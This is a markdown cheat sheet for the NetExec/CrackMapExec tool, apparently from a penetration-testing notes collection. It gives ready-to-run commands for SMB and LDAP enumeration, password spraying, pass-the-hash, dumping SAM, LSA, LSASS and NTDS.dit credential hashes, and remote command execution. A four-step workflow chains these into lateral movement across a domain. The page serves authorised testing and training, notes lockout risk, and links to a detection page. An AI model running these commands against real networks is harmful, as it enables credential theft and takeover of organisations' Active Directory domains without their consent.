# 🪟 NetExec / CrackMapExec Cheat Sheet

**NetExec** (`nxc`) is the actively-maintained successor to **CrackMapExec** (`cme`) — the Swiss-army knife for Active Directory and SMB. Spray creds, enumerate, and execute across a whole subnet at once. Commands are interchangeable: just swap `nxc` ⇄ `crackmapexec`.

```bash
# General syntax
nxc <protocol> <target> -u <user> -p <pass> [options]
```

Protocols: `smb`, `winrm`, `ldap`, `mssql`, `rdp`, `ssh`, `ftp`, `wmi`.

> 💡 Status flags in output: **`[+]`** valid creds · **`(Pwn3d!)`** you can execute code (admin) · **`[-]`** failed.

---

## Enumeration

| Command | Description |
| --- | --- |
| `nxc smb 10.10.10.0/24` | Sweep a subnet — hostnames, OS, domain, SMB signing |
| `nxc smb 10.10.10.1 -u user -p pass --shares` | List shares & your access (READ/WRITE) |
| `nxc smb 10.10.10.1 -u user -p pass --users` | Enumerate domain users |
| `nxc smb 10.10.10.1 -u user -p pass --groups` | Enumerate groups |
| `nxc smb 10.10.10.1 -u user -p pass --pass-pol` | Password policy (tune your spray!) |
| `nxc smb 10.10.10.1 -u '' -p ''` | Null session check |
| `nxc smb 10.10.10.1 -u user -p pass --loggedon-users` | Who's logged on |
| `nxc ldap 10.10.10.1 -u user -p pass --bloodhound -c all` | Collect [BloodHound](https://github.com/SpecterOps/BloodHound) data |

## Credential validation & spraying

| Command | Description |
| --- | --- |
| `nxc smb 10.10.10.1 -u users.txt -p passwords.txt` | Try every user × password |
| `nxc smb 10.10.10.1 -u users.txt -p 'Spring2025!'` | **Password spray** one password across users |
| `nxc smb 10.10.10.0/24 -u user -p pass` | Find where creds are valid (look for `Pwn3d!`) |
| `nxc smb 10.10.10.1 -u user -H <NThash>` | **Pass-the-Hash** (no password needed) |
| `nxc smb 10.10.10.1 -u user -p pass --local-auth` | Authenticate locally, not to the domain |

> ⚠️ Spraying locks accounts. Check `--pass-pol` first and stay under the lockout threshold.

## Post-exploitation (needs admin / `Pwn3d!`)

| Command | Description |
| --- | --- |
| `nxc smb 10.10.10.1 -u admin -p pass --sam` | Dump local SAM hashes |
| `nxc smb 10.10.10.1 -u admin -p pass --lsa` | Dump LSA secrets |
| `nxc smb 10.10.10.1 -u admin -p pass -M lsassy` | Dump LSASS creds (module) |
| `nxc smb 10.10.10.1 -u admin -p pass -x whoami` | Run a CMD command |
| `nxc smb 10.10.10.1 -u admin -p pass -X 'whoami'` | Run a PowerShell command |
| `nxc smb 10.10.10.1 -u admin -p pass --ntds` | Dump the **NTDS.dit** (all domain hashes — on a DC) |

---

## 🧭 Typical workflow

```bash
# 1. Map the subnet
nxc smb 10.10.10.0/24

# 2. Validate creds everywhere & find admin access
nxc smb 10.10.10.0/24 -u bob -p 'Password1' --shares

# 3. On a Pwn3d! box, dump hashes
nxc smb 10.10.10.5 -u bob -p 'Password1' --sam

# 4. Reuse a hash to move laterally (Pass-the-Hash)
nxc smb 10.10.10.6 -u administrator -H aad3b...:31d6c...
```

> 🔗 Crack dumped hashes with [hashcat](../hashcat)/[john](../john). Get a shell with [evil-winrm](../evil-winrm). Deeper AD attacks → [impacket](../impacket). Blue side → [DETECTION.md → Lateral movement](../DETECTION.md#8-lateral-movement-windowsad).
